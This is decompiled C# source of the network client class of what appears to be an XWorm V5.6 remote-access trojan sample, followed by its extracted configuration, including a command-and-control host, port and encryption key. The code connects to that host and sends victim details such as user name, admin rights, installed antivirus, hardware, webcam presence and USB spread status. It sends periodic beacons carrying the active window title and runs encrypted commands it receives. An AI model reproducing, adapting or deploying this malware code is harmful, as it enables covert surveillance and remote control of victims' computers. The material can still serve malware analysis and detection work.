// Decompiled with JetBrains decompiler
// Type: Stub.ClientSocket
// Assembly: DesignV3Sv, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FCAC0DD-9A5C-4DA4-BFB3-EE6355E60533
// Assembly location: C:\Users\hadesker\Desktop\Virus\DesignV\DesignV3Sv.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

#nullable disable
namespace Stub
{
  public class ClientSocket
  {
    public static bool isConnected = false;
    public static Socket S = (Socket) null;
    private static long BufferLength = 0;
    private static byte[] Buffer;
    private static MemoryStream MS = (MemoryStream) null;
    private static System.Threading.Timer Tick = (System.Threading.Timer) null;
    public static ManualResetEvent allDone = new ManualResetEvent(false);
    private static object SendSync = (object) null;
    public static System.Threading.Timer Speed;
    public static int Interval;
    public static bool ActivatePong;

    public static void BeginConnect()
    {
      try
      {
        string str = Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)];
        if (Helper.IsValidDomainName(str))
        {
          IPAddress[] hostAddresses = Dns.GetHostAddresses(str);
          int index = 0;
          while (index < hostAddresses.Length)
          {
            IPAddress ipAddress = hostAddresses[index];
            try
            {
              ClientSocket.ConnectServer(ipAddress.ToString());
              if (ClientSocket.isConnected)
                break;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
        }
        else
          ClientSocket.ConnectServer(str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static object ConnectServer(string H)
    {
      try
      {
        ClientSocket.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        ClientSocket.BufferLength = -1L;
        ClientSocket.Buffer = new byte[1];
        ClientSocket.MS = new MemoryStream();
        ClientSocket.S.ReceiveBufferSize = 51200;
        ClientSocket.S.SendBufferSize = 51200;
        ClientSocket.S.Connect(H, Conversions.ToInteger(Settings.Port));
        Settings.Host = H;
        ClientSocket.isConnected = true;
        ClientSocket.SendSync = RuntimeHelpers.GetObjectValue(new object());
        ClientSocket.Send(Conversions.ToString(ClientSocket.Info()));
        ClientSocket.ActivatePong = false;
        ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), (object) null);
        ClientSocket.Tick = new System.Threading.Timer((TimerCallback) (a0 => ClientSocket.Ping()), (object) null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
        ClientSocket.Speed = new System.Threading.Timer(new TimerCallback(ClientSocket.Pong), (object) null, 1, 1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ClientSocket.isConnected = false;
        ProjectData.ClearProjectError();
      }
      finally
      {
        ClientSocket.allDone.Set();
      }
      object obj;
      return obj;
    }

    public static object Info()
    {
      ComputerInfo computerInfo = new ComputerInfo();
      return (object) ("INFO" + Settings.SPL + Helper.ID() + Settings.SPL + Environment.UserName + Settings.SPL + computerInfo.OSFullName.Replace("Microsoft", (string) null) + (Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ") + Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit") + Settings.SPL + Settings.Groub + Settings.SPL + ClientSocket.INDATE() + Settings.SPL + ClientSocket.Spread() + Settings.SPL + ClientSocket.UAC() + Settings.SPL + (object) Messages.Cam() + Settings.SPL + ClientSocket.CPU() + Settings.SPL + ClientSocket.GPU() + Settings.SPL + ClientSocket.RAM() + Settings.SPL + ClientSocket.Antivirus());
    }

    public static string INDATE()
    {
      string str;
      try
      {
        str = new FileInfo(Helper.current).LastWriteTime.ToString("dd/MM/yyy");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string Spread()
    {
      string str;
      try
      {
        str = Operators.CompareString(Path.GetFileName(Helper.current), Settings.USBNM, false) != 0 ? "False" : "True";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string UAC()
    {
      string str;
      try
      {
        str = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string Antivirus()
    {
      string str;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
        {
          StringBuilder stringBuilder = new StringBuilder();
          try
          {
            foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
            {
              stringBuilder.Append(managementBaseObject["displayName"].ToString());
              stringBuilder.Append(",");
            }
          }
          finally
          {
            ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
            objectEnumerator?.Dispose();
          }
          str = stringBuilder.ToString().Length != 0 ? stringBuilder.ToString().Substring(0, checked (stringBuilder.Length - 1)) : "None";
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "None";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string GPU()
    {
      string str;
      try
      {
        string empty = string.Empty;
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ObjectQuery("SELECT * FROM Win32_VideoController"));
        try
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            empty = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) empty, managementObject["Name"]), (object) " "));
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        str = empty;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string CPU()
    {
      string str;
      try
      {
        ManagementObject managementObject = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
        managementObject.Get();
        str = managementObject["Name"].ToString().Replace("(R)", "").Replace("Core(TM)", "").Replace(nameof (CPU), "");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string RAM()
    {
      string str1;
      try
      {
        string str2 = (string) null;
        long num = checked ((long) Math.Round(Conversion.Val((object) MyProject.Computer.Info.TotalPhysicalMemory)));
        if (num > 1073741824L)
        {
          string str3 = ((double) num / 1073741824.0).ToString();
          str2 = str3.Remove(4, checked (str3.Length - 4)) + " GB";
        }
        else if (num > 1048576L)
        {
          string str4 = ((double) num / 1048576.0).ToString();
          str2 = str4.Remove(4, checked (str4.Length - 4)) + " MB";
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "Error";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static void BeginReceive(IAsyncResult ar)
    {
      if (!ClientSocket.isConnected)
        return;
      try
      {
        int count = ClientSocket.S.EndReceive(ar);
        if (count > 0)
        {
          if (ClientSocket.BufferLength == -1L)
          {
            if (ClientSocket.Buffer[0] == (byte) 0)
            {
              ClientSocket.BufferLength = Conversions.ToLong(Helper.BS(ClientSocket.MS.ToArray()));
              ClientSocket.MS.Dispose();
              ClientSocket.MS = new MemoryStream();
              if (ClientSocket.BufferLength == 0L)
              {
                ClientSocket.BufferLength = -1L;
                ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), (object) ClientSocket.S);
                return;
              }
              ClientSocket.Buffer = new byte[checked ((int) (ClientSocket.BufferLength - 1L) + 1)];
            }
            else
              ClientSocket.MS.WriteByte(ClientSocket.Buffer[0]);
          }
          else
          {
            ClientSocket.MS.Write(ClientSocket.Buffer, 0, count);
            if (ClientSocket.MS.Length == ClientSocket.BufferLength)
            {
              NewLateBinding.LateCall((object) new Thread((ParameterizedThreadStart) (a0 => ClientSocket.BeginRead((byte[]) a0))), (Type) null, "Start", new object[1]
              {
                (object) ClientSocket.MS.ToArray()
              }, (string[]) null, (Type[]) null, (bool[]) null, true);
              ClientSocket.BufferLength = -1L;
              ClientSocket.MS.Dispose();
              ClientSocket.MS = new MemoryStream();
              ClientSocket.Buffer = new byte[1];
            }
            else
              ClientSocket.Buffer = new byte[checked ((int) (ClientSocket.BufferLength - ClientSocket.MS.Length - 1L) + 1)];
          }
          ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), (object) ClientSocket.S);
        }
        else
          ClientSocket.isConnected = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ClientSocket.isConnected = false;
        ProjectData.ClearProjectError();
      }
    }

    public static void BeginRead(byte[] b)
    {
      try
      {
        Messages.Read(b);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Send(string msg)
    {
      object sendSync = ClientSocket.SendSync;
      ObjectFlowControl.CheckForSyncLockOnValueType(sendSync);
      bool lockTaken = false;
      try
      {
        Monitor.Enter(sendSync, ref lockTaken);
        if (!ClientSocket.isConnected)
          return;
        try
        {
          using (MemoryStream memoryStream = new MemoryStream())
          {
            byte[] buffer1 = Helper.AES_Encryptor(Helper.SB(msg));
            byte[] buffer2 = Helper.SB(Conversions.ToString(buffer1.Length) + "\0");
            memoryStream.Write(buffer2, 0, buffer2.Length);
            memoryStream.Write(buffer1, 0, buffer1.Length);
            ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
            ClientSocket.S.BeginSend(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None, new AsyncCallback(ClientSocket.EndSend), (object) null);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ClientSocket.isConnected = false;
          ProjectData.ClearProjectError();
        }
      }
      finally
      {
        if (lockTaken)
          Monitor.Exit(sendSync);
      }
    }

    public static void EndSend(IAsyncResult ar)
    {
      try
      {
        ClientSocket.S.EndSend(ar);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ClientSocket.isConnected = false;
        ProjectData.ClearProjectError();
      }
    }

    public static void isDisconnected()
    {
      if (ClientSocket.Tick != null)
      {
        try
        {
          ClientSocket.Tick.Dispose();
          ClientSocket.Tick = (System.Threading.Timer) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ClientSocket.Speed != null)
      {
        try
        {
          ClientSocket.Speed.Dispose();
          ClientSocket.Speed = (System.Threading.Timer) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ClientSocket.MS != null)
      {
        try
        {
          ClientSocket.MS.Close();
          ClientSocket.MS.Dispose();
          ClientSocket.MS = (MemoryStream) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ClientSocket.S != null)
      {
        try
        {
          ClientSocket.S.Close();
          ClientSocket.S.Dispose();
          ClientSocket.S = (Socket) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      GC.Collect();
    }

    public static void Pong(object obj)
    {
      try
      {
        if (!ClientSocket.ActivatePong || !ClientSocket.isConnected)
          return;
        checked { ++ClientSocket.Interval; }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ping()
    {
      try
      {
        if (!ClientSocket.isConnected)
          return;
        ClientSocket.Send("PING!" + Settings.SPL + Helper.GetActiveWindowTitle() + Settings.SPL + Helper.Time);
        ClientSocket.ActivatePong = true;
        GC.Collect();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}

/*
Host: deoxyzzz-42234.portmap.host
Port: 42234
key: <123456789>
spl: <Xwormmm>
groub: XWorm V5.6
usbnm: USB.exe

*/